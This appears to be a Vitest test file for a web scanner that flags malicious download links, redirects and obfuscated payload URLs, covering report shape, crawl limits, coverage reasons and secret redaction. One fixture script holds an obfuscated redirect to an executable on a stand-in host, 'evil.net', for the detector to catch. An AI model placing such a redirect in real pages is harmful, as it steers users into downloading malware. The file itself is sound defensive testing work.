import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { scan, ENGINE_VERSION, DEFAULT_DETECTORS } from '../../src/engine/scan.js';
import { createBudget } from '../../src/engine/budget.js';
import { validateReport } from '../../src/schema/report.js';
import { analyzer, htmlDoc, scriptDoc, binaryDoc, fakeClient } from '../helpers/fakeScan.js';

const ROOT = 'https://x.com/';
const fixture = (n) => readFileSync(new URL(`../fixtures/scan/${n}`, import.meta.url), 'utf8');
const run = (client, url = ROOT, extra = {}) => scan(url, { client, analyzer, ...extra });
const covs = (report, reason) => report.coverage.filter((c) => c.reason === reason);
const ruleIds = (report) => report.findings.map((f) => f.ruleId);

describe('report shape', () => {
  it('produces a valid report with versions, stats and findings', async () => {
    const client = fakeClient({
      [ROOT]: htmlDoc(ROOT, fixture('landing.html'), { headers: { server: 'nginx' } }),
      'https://x.com/js/app.js': scriptDoc('https://x.com/js/app.js', 'var a = 1;'),
      'https://x.com/files/setup.exe': binaryDoc('https://x.com/files/setup.exe', 'application/x-msdownload', { headers: { 'content-disposition': 'attachment; filename="setup.exe"' } }),
    });
    const report = await run(client);
    expect(validateReport(report)).toEqual({ ok: true, errors: [] });
    expect(report).toMatchObject({ v: 1, engineVersion: ENGINE_VERSION, target: ROOT, finalUrl: ROOT, headers: { server: 'nginx' } });
    expect(Object.keys(report.detectorVersions).sort()).toEqual(DEFAULT_DETECTORS.map((d) => d.id).sort());
    expect(report.fetchStats).toEqual({ attempted: 3, successful: 3, cached: 0, failed: 0 }); // root, app.js, setup.exe ("About us" has no download hint)
    expect(report.pagesScanned.map((p) => p.url)).toEqual([ROOT, 'https://x.com/files/setup.exe']);
    expect(ruleIds(report)).toEqual(expect.arrayContaining(['payload.link.executable', 'header.executable-content-type', 'header.content-disposition-attachment']));
    expect(covs(report, 'external_stylesheet_skipped')).toHaveLength(1);
    expect(covs(report, 'binary_not_inspected')).toHaveLength(1);
  });
});

describe('following', () => {
  it('never fetches links found on followed pages (depth 1)', async () => {
    const client = fakeClient({
      [ROOT]: htmlDoc(ROOT, '<a href="/download/one">Download</a>'),
      'https://x.com/download/one': htmlDoc('https://x.com/download/one', '<a href="/download/two">Download</a><a href="/f/deep.exe">x</a>'),
    });
    await run(client);
    expect(client.calls.map((c) => c.url)).toEqual([ROOT, 'https://x.com/download/one']);
  });

  it('follows at most 6 pages, in priority order', async () => {
    const links = [
      ...Array.from({ length: 5 }, (_, i) => `<a href="/download/p${i}">Download ${i}</a>`),
      ...Array.from({ length: 5 }, (_, i) => `<a href="/files/f${i}.exe">file</a>`),
    ].join('');
    const routes = { [ROOT]: htmlDoc(ROOT, links) };
    for (let i = 0; i < 5; i++) {
      routes[`https://x.com/download/p${i}`] = htmlDoc(`https://x.com/download/p${i}`, '<p>x</p>');
      routes[`https://x.com/files/f${i}.exe`] = binaryDoc(`https://x.com/files/f${i}.exe`, 'application/x-msdownload');
    }
    const client = fakeClient(routes);
    await run(client);
    const followed = client.calls.slice(1).map((c) => c.url);
    expect(followed).toHaveLength(6);
    expect(followed.filter((u) => u.endsWith('.exe'))).toHaveLength(5); // priority 1 first
    expect(followed.filter((u) => u.includes('/download/p'))).toHaveLength(1);
  });

  it('fetches at most 4 same-origin scripts and skips well-known libraries', async () => {
    const scripts = ['a1', 'a2', 'jquery.min', 'a3', 'bootstrap.bundle', 'a4', 'a5'].map((n) => `<script src="/js/${n}.js"></script>`).join('')
      + '<script src="https://cdn.other.net/x.js"></script>';
    const routes = { [ROOT]: htmlDoc(ROOT, `<p>${'text '.repeat(60)}</p>${scripts}`) };
    for (const n of ['a1', 'a2', 'a3', 'a4', 'a5']) routes[`https://x.com/js/${n}.js`] = scriptDoc(`https://x.com/js/${n}.js`, 'var z = 1;');
    const client = fakeClient(routes);
    await run(client);
    const fetched = client.calls.filter((c) => c.kind === 'script').map((c) => c.url);
    expect(fetched).toEqual(['a1', 'a2', 'a3', 'a4'].map((n) => `https://x.com/js/${n}.js`));
  });

  it('analyzes external scripts and feeds them to detectors', async () => {
    const client = fakeClient({
      [ROOT]: htmlDoc(ROOT, `<p>${'text '.repeat(60)}</p><script src="/s.js"></script>`),
      'https://x.com/s.js': scriptDoc('https://x.com/s.js', "location = 'ht'+'tp://evil.net/a.exe';"),
      'http://evil.net/a.exe': binaryDoc('http://evil.net/a.exe', 'application/octet-stream'),
    });
    const report = await run(client);
    expect(ruleIds(report)).toEqual(expect.arrayContaining(['obfuscation.decoded-payload-url', 'redirect.script-navigation']));
    expect(client.calls.map((c) => c.url)).toContain('http://evil.net/a.exe');
  });

  it('drops candidate URLs longer than 4 KiB', async () => {
    const client = fakeClient({ [ROOT]: htmlDoc(ROOT, `<a href="/download/${'a'.repeat(4100)}">Download</a>`) });
    await run(client);
    expect(client.calls).toHaveLength(1);
  });
});

describe('coverage', () => {
  it('records scan_deadline_reached and skips further fetches', async () => {
    let t = 0;
    const now = () => t;
    const client = fakeClient({
      [ROOT]: () => { t += 46000; return htmlDoc(ROOT, '<a href="/download/one">Download</a>'); },
      'https://x.com/download/one': htmlDoc('https://x.com/download/one', '<p>x</p>'),
    });
    const report = await run(client, ROOT, { now, budget: createBudget({}, now) });
    expect(client.calls).toHaveLength(1);
    expect(covs(report, 'scan_deadline_reached')).toEqual([{ check: 'scan', state: 'skipped', reason: 'scan_deadline_reached' }]);
    expect(validateReport(report).ok).toBe(true);
  });

  it('records resource_budget_exhausted when the page budget is spent', async () => {
    const client = fakeClient({
      [ROOT]: htmlDoc(ROOT, '<a href="/download/a">Download</a><a href="/download/b">Download</a>'),
      'https://x.com/download/a': htmlDoc('https://x.com/download/a', '<p>a</p>'),
      'https://x.com/download/b': htmlDoc('https://x.com/download/b', '<p>b</p>'),
    });
    const report = await run(client, ROOT, { budget: createBudget({ pages: 2 }) });
    expect(client.calls).toHaveLength(2);
    expect(covs(report, 'resource_budget_exhausted')).toHaveLength(1);
  });

  it('records response_truncated', async () => {
    const client = fakeClient({ [ROOT]: htmlDoc(ROOT, '<p>big</p>', { truncated: true, bytesRead: 1048576 }) });
    const report = await run(client);
    expect(covs(report, 'response_truncated')).toEqual([{ check: 'fetch', page: ROOT, state: 'unknown', reason: 'response_truncated' }]);
    expect(report.pagesScanned[0]).toMatchObject({ truncated: true, bytesRead: 1048576 });
  });

  it('turns rate_limited failures into coverage and still produces a valid report', async () => {
    const client = fakeClient({ [ROOT]: { error: 'rate_limited', detail: 'too many requests' } });
    const report = await run(client);
    expect(validateReport(report)).toEqual({ ok: true, errors: [] });
    expect(report).toMatchObject({ finalUrl: null, findings: [], pagesScanned: [], fetchStats: { attempted: 1, successful: 0, failed: 1 } });
    expect(report.coverage).toEqual([{ check: 'fetch', page: ROOT, state: 'unknown', reason: 'rate_limited' }]);
  });

  it('flags a JavaScript-rendered shell as unknown static coverage', async () => {
    const client = fakeClient({
      [ROOT]: htmlDoc(ROOT, fixture('shell.html')),
      'https://x.com/bundle.js': scriptDoc('https://x.com/bundle.js', 'var app = 1;'),
    });
    const report = await run(client);
    expect(report.coverage).toContainEqual({ check: 'static-coverage', page: ROOT, state: 'unknown', reason: 'unsupported_runtime_behavior' });
  });

  it('a substantial server-rendered page has no static-coverage entry', async () => {
    const client = fakeClient({ [ROOT]: htmlDoc(ROOT, fixture('landing.html')), 'https://x.com/js/app.js': scriptDoc('https://x.com/js/app.js', ';') });
    const report = await run(client);
    expect(report.coverage.some((c) => c.check === 'static-coverage')).toBe(false);
  });

  it('a root application/zip gives skipped coverage and a payload.link.archive finding', async () => {
    const url = 'https://x.com/files/a.zip';
    const report = await run(fakeClient({ [url]: binaryDoc(url, 'application/zip') }), url);
    expect(report.coverage).toContainEqual({ check: 'binary-content', page: url, state: 'skipped', reason: 'binary_not_inspected' });
    const f = report.findings.find((x) => x.ruleId === 'payload.link.archive');
    expect(f).toMatchObject({ severity: 'info', category: 'payload' });
    expect(f.observations[0].evidence.location.type).toBe('response_header');
    expect(validateReport(report).ok).toBe(true);
  });

  it.each([
    ['403', htmlDoc(ROOT, '<p>Forbidden</p>', { status: 403 })],
    ['503', htmlDoc(ROOT, '<p>Unavailable</p>', { status: 503 })],
    ['Just a moment', htmlDoc(ROOT, '<title>Just a moment...</title><p>Checking your browser</p>')],
    ['captcha', htmlDoc(ROOT, '<div class="g-recaptcha">captcha</div>')],
  ])('%s gives fetch_blocked_or_challenge coverage', async (_name, doc) => {
    const report = await run(fakeClient({ [ROOT]: doc }));
    expect(report.coverage).toContainEqual({ check: 'fetch', page: ROOT, state: 'unknown', reason: 'fetch_blocked_or_challenge' });
    expect(validateReport(report).ok).toBe(true);
  });

  it('does not run detectors on 403/503 error pages', async () => {
    const report = await run(fakeClient({ [ROOT]: htmlDoc(ROOT, '<a href="/a.exe">x</a>', { status: 403 }) }));
    expect(report.findings).toEqual([]);
  });

  it('a throwing detector becomes coverage and the scan still completes', async () => {
    const bad = { id: 'bad', version: '9', run: () => { throw new Error('boom'); } };
    const report = await run(fakeClient({ [ROOT]: htmlDoc(ROOT, '<p>x</p>') }), ROOT, { detectors: [bad] });
    expect(report.coverage).toContainEqual({ check: 'bad', page: ROOT, state: 'unknown', reason: 'detector_failed' });
    expect(report.detectorVersions).toEqual({ bad: '9' });
  });
});

describe('privacy', () => {
  it('fetches the full URL but never puts SECRET123 in the report', async () => {
    const url = 'https://example.com/download?token=SECRET123';
    const client = fakeClient({
      [url]: htmlDoc(url, '<a href="/files/a.exe?key=SECRET123">Download</a>', { chain: [{ url, status: 302, location: `${url}&x=1` }, { url, status: 200 }] }),
    });
    const report = await run(client, url);
    expect(client.calls[0].url).toBe(url);
    expect(JSON.stringify(report)).not.toContain('SECRET123');
    expect(JSON.stringify(report)).toContain('token=REDACTED');
    expect(validateReport(report).ok).toBe(true);
  });
});

describe('progress', () => {
  it('reports phases through onProgress and survives a throwing callback', async () => {
    const phases = [];
    const client = fakeClient({ [ROOT]: htmlDoc(ROOT, '<p>x</p>') });
    await run(client, ROOT, { onProgress: (s) => { phases.push(s.phase); } });
    expect(phases[0]).toBe('fetching');
    expect(phases.at(-1)).toBe('done');
    await expect(run(client, ROOT, { onProgress: () => { throw new Error('ui'); } })).resolves.toBeTruthy();
  });
});
